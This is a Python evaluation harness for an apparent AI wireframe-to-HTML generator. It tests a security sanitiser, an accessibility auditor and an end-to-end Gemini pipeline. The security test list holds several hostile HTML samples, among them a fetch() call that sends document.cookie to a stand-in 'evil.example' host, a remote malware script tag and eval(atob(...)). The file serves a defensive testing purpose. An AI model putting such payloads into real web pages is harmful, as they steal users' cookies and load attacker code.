"""
RetinaStyle AI -- evaluation harness
====================================
Tests the *quality and safety* of the system, the way the course's
"Agent Quality & Security" material recommends. Two suites:

  Suite A -- Guardrail evals (OFFLINE, no API):
      Feed known-malicious and known-clean HTML through the security
      validator and the accessibility auditor, and assert that dangerous
      code is neutralised, clean code passes, and a11y problems are caught.
      Deterministic -- runs even when the model is rate-limited or down.

  Suite B -- End-to-end evals (ONLINE, needs Gemini):
      Run sample wireframes through the full 4-agent + MCP pipeline and
      assert the output is non-empty, looks like HTML, includes the Tailwind
      CDN, and survives the security pass. Also records latency.

Usage:
    python evaluate.py            # Suite A, then Suite B if the API responds
    python evaluate.py --offline  # Suite A only (no API calls)

Exit code is 0 only if every CRITICAL check passes, so this can gate CI.
API-unavailable (429/503) does NOT fail the run -- it is reported as skipped.
"""

import io
import re
import sys
import time
import asyncio

# Pull the *real* guardrail logic from the app so we test what actually ships.
from app import sanitize_ui_code, audit_accessibility, BLOCKED_PATTERNS

GREEN, RED, YEL, DIM, RESET = "\033[92m", "\033[91m", "\033[93m", "\033[2m", "\033[0m"
PASS, FAIL, SKIP = f"{GREEN}PASS{RESET}", f"{RED}FAIL{RESET}", f"{YEL}SKIP{RESET}"


# ----------------------------------------------------------------------------
# Suite A -- guardrail evals (offline, deterministic)
# ----------------------------------------------------------------------------

# Each case: (name, html, expect_findings)  -- expect_findings True = malicious.
_SECURITY_CASES = [
    ("clean tailwind page",
     '<!DOCTYPE html><html lang="en"><head>'
     '<script src="https://cdn.tailwindcss.com"></script></head>'
     '<body><h1>Hi</h1></body></html>',
     False),
    ("eval() injection",
     '<button onclick="eval(atob(x))">go</button>',
     True),
    ("fetch() exfiltration",
     '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>',
     True),
    ("document.cookie access",
     '<script>var c = document.cookie;</script>',
     True),
    ("localStorage write",
     '<script>localStorage.setItem("k","v")</script>',
     True),
    ("remote script tag",
     '<script src="https://evil.example/malware.js"></script>',
     True),
    ("iframe parent escape",
     '<script>window.parent.location = "https://evil.example"</script>',
     True),
]

# Each case: (name, html, must_contain_substring or None for "no issues")
_A11Y_CASES = [
    ("missing lang on <html>",
     '<html><body><p>hi</p></body></html>', "lang"),
    ("image without alt",
     '<html lang="en"><body><img src="x.png"></body></html>', "alt"),
    ("input without label",
     '<html lang="en"><body><input type="text"></body></html>', "label"),
    ("fully accessible page",
     '<html lang="en"><body><label>Name<input></label>'
     '<img src="x.png" alt="x"><button>Go</button></body></html>', None),
]


def _still_dangerous(cleaned: str) -> list[str]:
    """Return any blocked patterns that STILL match after sanitisation."""
    return [p for p in BLOCKED_PATTERNS if re.search(p, cleaned, flags=re.IGNORECASE)]


def run_suite_a() -> tuple[int, int]:
    """Returns (passed, failed)."""
    passed = failed = 0
    print(f"\n{DIM}== Suite A -- Guardrail evals (offline) =={RESET}\n")

    print("  Security validator:")
    for name, html, is_malicious in _SECURITY_CASES:
        cleaned, findings = sanitize_ui_code(html)
        leftover = _still_dangerous(cleaned)
        if is_malicious:
            # must (1) flag at least one finding, (2) leave nothing dangerous behind
            ok = bool(findings) and not leftover
            detail = "" if ok else (
                f"  (findings={len(findings)}, leftover={len(leftover)})")
        else:
            ok = not findings  # clean input must not be flagged
            detail = "" if ok else f"  (false positives: {findings})"
        print(f"    [{PASS if ok else FAIL}] {name}{detail}")
        passed, failed = (passed + 1, failed) if ok else (passed, failed + 1)

    print("\n  Accessibility auditor:")
    for name, html, must_contain in _A11Y_CASES:
        issues = audit_accessibility(html)
        if must_contain is None:
            ok = not issues
            detail = "" if ok else f"  (unexpected: {issues})"
        else:
            ok = any(must_contain in i for i in issues)
            detail = "" if ok else f"  (issues={issues})"
        print(f"    [{PASS if ok else FAIL}] {name}{detail}")
        passed, failed = (passed + 1, failed) if ok else (passed, failed + 1)

    return passed, failed


# ----------------------------------------------------------------------------
# Suite B -- end-to-end evals (online, needs the model)
# ----------------------------------------------------------------------------

def _make_wireframes() -> list[tuple[str, bytes]]:
    """Draw a few realistic wireframe sketches. Needs Pillow (dev-only)."""
    try:
        from PIL import Image, ImageDraw
    except ImportError:
        return []

    def canvas(draw_fn, w=720, h=520):
        img = Image.new("RGB", (w, h), (12, 14, 24))
        d = ImageDraw.Draw(img)
        draw_fn(d)
        buf = io.BytesIO()
        img.save(buf, "PNG")
        return buf.getvalue()

    W = (235, 238, 242)  # pen colour (near-white), width 4

    def login(d):
        d.rectangle((180, 90, 540, 430), outline=W, width=4)      # card
        d.line((230, 150, 490, 150), fill=W, width=4)             # title
        d.rectangle((230, 200, 490, 240), outline=W, width=4)     # input
        d.rectangle((230, 270, 490, 310), outline=W, width=4)     # input
        d.rectangle((300, 350, 420, 395), outline=W, width=4)     # button

    def card(d):
        d.rectangle((160, 80, 560, 440), outline=W, width=4)      # card
        d.rectangle((200, 120, 520, 280), outline=W, width=4)     # image area
        d.line((200, 320, 470, 320), fill=W, width=4)             # caption
        d.rectangle((200, 360, 320, 405), outline=W, width=4)     # button

    def search(d):
        d.rectangle((120, 210, 480, 260), outline=W, width=4)     # search field
        d.rectangle((500, 210, 610, 260), outline=W, width=4)     # button

    return [("login screen", canvas(login)),
            ("media card", canvas(card)),
            ("search bar", canvas(search))]


async def run_suite_b() -> tuple[int, int, int]:
    """Returns (passed, failed, skipped)."""
    from agents import run_agent_pipeline

    print(f"\n{DIM}== Suite B -- End-to-end evals (online) =={RESET}\n")
    sketches = _make_wireframes()
    if not sketches:
        print(f"    [{SKIP}] Pillow not installed -- run `pip install pillow` "
              f"to enable end-to-end evals.")
        return 0, 0, 1

    passed = failed = skipped = 0
    latencies = []
    for name, png in sketches:
        t0 = time.time()
        try:
            result = await run_agent_pipeline(png, style="modern, clean, light")
        except Exception as e:  # noqa: BLE001
            msg = str(e).lower()
            if any(k in msg for k in ("429", "503", "resource_exhausted",
                                      "unavailable", "quota", "high demand")):
                print(f"    [{SKIP}] {name}: model unavailable (rate-limit/busy)")
                skipped += 1
                continue
            print(f"    [{FAIL}] {name}: pipeline raised {type(e).__name__}: "
                  f"{str(e)[:80]}")
            failed += 1
            continue

        dt = time.time() - t0
        latencies.append(dt)
        code = result.get("code", "")
        cleaned, findings = sanitize_ui_code(code)

        checks = {
            "non-empty output": len(code.strip()) > 50,
            "looks like HTML": "<" in code and ("html" in code.lower()
                                                or "<body" in code.lower()),
            "uses Tailwind CDN": "cdn.tailwindcss.com" in code,
            "passes security": not _still_dangerous(cleaned),
            "spec produced": len(result.get("spec", "").strip()) > 10,
        }
        ok = all(checks.values())
        a11y = audit_accessibility(cleaned)
        bad = [k for k, v in checks.items() if not v]
        print(f"    [{PASS if ok else FAIL}] {name}  "
              f"{DIM}({dt:.1f}s, {len(code)} chars, "
              f"{len(findings)} sec-findings, {len(a11y)} a11y-notes){RESET}"
              + ("" if ok else f"\n           failed: {', '.join(bad)}"))
        passed, failed = (passed + 1, failed) if ok else (passed, failed + 1)

    if latencies:
        avg = sum(latencies) / len(latencies)
        print(f"\n    {DIM}avg latency: {avg:.1f}s over {len(latencies)} "
              f"generation(s){RESET}")
    return passed, failed, skipped


# ----------------------------------------------------------------------------
# main
# ----------------------------------------------------------------------------

def main():
    offline = "--offline" in sys.argv
    print(f"{DIM}RetinaStyle AI -- evaluation harness{RESET}")

    a_pass, a_fail = run_suite_a()

    b_pass = b_fail = b_skip = 0
    if offline:
        print(f"\n{DIM}(Suite B skipped: --offline){RESET}")
    else:
        b_pass, b_fail, b_skip = asyncio.run(run_suite_b())

    print(f"\n{DIM}{'-'*52}{RESET}")
    print(f"  Suite A (guardrails): {GREEN}{a_pass} passed{RESET}, "
          f"{RED if a_fail else DIM}{a_fail} failed{RESET}")
    if not offline:
        print(f"  Suite B (end-to-end): {GREEN}{b_pass} passed{RESET}, "
              f"{RED if b_fail else DIM}{b_fail} failed{RESET}, "
              f"{YEL if b_skip else DIM}{b_skip} skipped{RESET}")

    # Only guardrail failures and genuine pipeline failures gate the exit code.
    # Model-unavailable (skipped) does not fail the run.
    critical_failures = a_fail + b_fail
    if critical_failures:
        print(f"\n  {RED}RESULT: {critical_failures} critical check(s) "
              f"failed.{RESET}")
        sys.exit(1)
    print(f"\n  {GREEN}RESULT: all critical checks passed.{RESET}")
    sys.exit(0)


if __name__ == "__main__":
    main()